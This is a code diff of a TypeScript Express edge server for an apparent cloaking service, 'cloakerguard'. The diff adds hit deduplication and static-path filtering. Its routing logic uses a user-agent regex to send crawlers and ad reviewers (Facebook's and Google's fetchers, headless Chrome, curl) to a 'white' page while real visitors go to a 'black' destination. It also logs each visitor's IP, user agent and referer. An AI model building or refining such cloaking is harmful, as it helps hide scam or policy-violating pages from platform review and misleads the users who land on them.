@@ -8,7 +8,11 @@ const app = express();
 const PORT = Number(process.env.PORT || 8080);
 const API_URL = process.env.API_URL || "https://api.cloakerguard.com.br";
 
-// Funções de log seguras (stdout/stderr direto)
+// cache simples em memória para deduplicar hits
+const recentHits = new Map<string, number>();
+const DEDUP_WINDOW_MS = 5000;
+
+// Funções de log seguras
 function log(...args: any[]) {
   process.stdout.write(args.map(String).join(" ") + "\n");
 }
@@ -20,15 +24,27 @@ function normalizeHost(raw = "") {
   return raw.split(",")[0].trim().toLowerCase().replace(/:\d+$/, "");
 }
 
-// 🔑 garante URL absoluta com https://
 function normalizeTarget(url: string | undefined | null): string | null {
   if (!url) return null;
-  let clean = url.trim();
-  clean = clean.replace(/^\/+/, "");
-  if (!/^https?:\/\//i.test(clean)) {
-    clean = `https://${clean}`;
-  }
+  let clean = url.trim().replace(/^\/+/, "");
+  if (!/^https?:\/\//i.test(clean)) clean = `https://${clean}`;
   return clean;
+}
+
+// checa se deve ignorar o path
+function isIgnoredPath(path: string): boolean {
+  return (
+    path.startsWith("/favicon") ||
+    path.startsWith("/robots.txt") ||
+    path.startsWith("/apple-touch-icon") ||
+    path.startsWith("/static/") ||
+    path.endsWith(".png") ||
+    path.endsWith(".jpg") ||
+    path.endsWith(".jpeg") ||
+    path.endsWith(".gif") ||
+    path.endsWith(".css") ||
+    path.endsWith(".js")
+  );
 }
 
 app.use(async (req: any, res) => {
@@ -38,77 +54,81 @@ app.use(async (req: any, res) => {
     );
     if (!host) return res.status(400).send("Host header required");
 
-    const ua = req.headers["user-agent"]?.toLowerCase() || "";
-    const referer = req.headers["referer"] || req.headers["referrer"] || "";
+    const path = req.url || "/";
     const ip =
       (req.headers["x-forwarded-for"] as string)?.split(",")[0] ||
-      req.socket.remoteAddress;
+      req.socket.remoteAddress ||
+      "";
 
+    const ua = req.headers["user-agent"]?.toLowerCase() || "";
     log("=== Nova requisição recebida ===");
-    log("[EDGE] Host normalizado:", host);
-    log("[EDGE] UA:", ua || "(sem UA)");
+    log("[EDGE] Host:", host, "Path:", path, "IP:", ip, "UA:", ua);
 
-    // chamada para API central
+    // ignora paths que não são página principal
+    if (isIgnoredPath(path)) {
+      log("[EDGE] Ignorado path:", path);
+      return res.status(204).end();
+    }
+
+    // chama API central
     const resp = await axios.get(`${API_URL}/domains/resolve`, {
       params: { host },
       timeout: 5000,
     });
 
     const data = resp.data;
-    log("[EDGE] Dados recebidos da API:", JSON.stringify(data));
 
-    // regra de bot
+    // detecção de bot
     const isBot =
       /bot|crawl|slurp|spider|mediapartners|facebookexternalhit|headlesschrome|curl/i.test(
         ua
       );
 
-    log("[EDGE] ISBOT:", isBot);
+    let target: string | null = isBot
+      ? normalizeTarget(data.whiteOrigin)
+      : normalizeTarget(data.blackOrigin);
 
-    let target: string | null = null;
-
-    if (isBot) {
-      target = normalizeTarget(data.whiteOrigin);
-      log("[EDGE] Bot detectado → enviando para whiteOrigin");
-    } else {
-      target = normalizeTarget(data.blackOrigin);
-      log("[EDGE] Usuário normal → enviando para blackOrigin");
-    }
-
-    // fallback
     if (!target) {
       target = normalizeTarget(data.blackOrigin || data.whiteOrigin);
-      log("[EDGE] Fallback acionado → target:", target);
     }
 
     if (!target) {
-      error(
-        "[EDGE] Nenhum destino configurado para host:",
-        host,
-        "data:",
-        data
-      );
+      error("[EDGE] Nenhum destino configurado para host:", host);
       return res.status(500).send("Nenhum destino configurado");
     }
 
-    // registra hit no backend
-    try {
-      await axios.post(`${API_URL}/analytics/hit`, {
-        userId: data.userId,
-        domainId: data.id,
-        domainName: data.host,
-        decision: isBot ? "filtered" : "passed",
-        reason: isBot ? "bot" : "unknown",
-        ip,
-        ua,
-        referer,
-      });
-    } catch (err: any) {
-      error("[EDGE] Falha ao registrar hit:", err.message);
+    // deduplicação de hits
+    const key = `${host}:${ip}`;
+    const now = Date.now();
+    const last = recentHits.get(key);
+    if (!last || now - last > DEDUP_WINDOW_MS) {
+      recentHits.set(key, now);
+
+      try {
+        await axios.post(`${API_URL}/analytics/hit`, {
+          userId: data.userId,
+          domainId: data.id,
+          domainName: data.host,
+          decision: isBot ? "filtered" : "passed",
+          reason: isBot ? "bot" : "unknown",
+          ip,
+          ua,
+          referer: req.headers["referer"] || req.headers["referrer"] || "",
+        });
+        log("[EDGE] Hit registrado:", {
+          host,
+          ip,
+          decision: isBot ? "filtered" : "passed",
+          target,
+        });
+      } catch (err: any) {
+        error("[EDGE] Falha ao registrar hit:", err.message);
+      }
+    } else {
+      log("[EDGE] Hit duplicado ignorado para", key);
     }
 
     log(`[EDGE] Redirecionando ${host} -> ${target}`);
-
     res.setHeader("Cache-Control", "no-store");
     return res.redirect(302, target);
   } catch (err: any) {
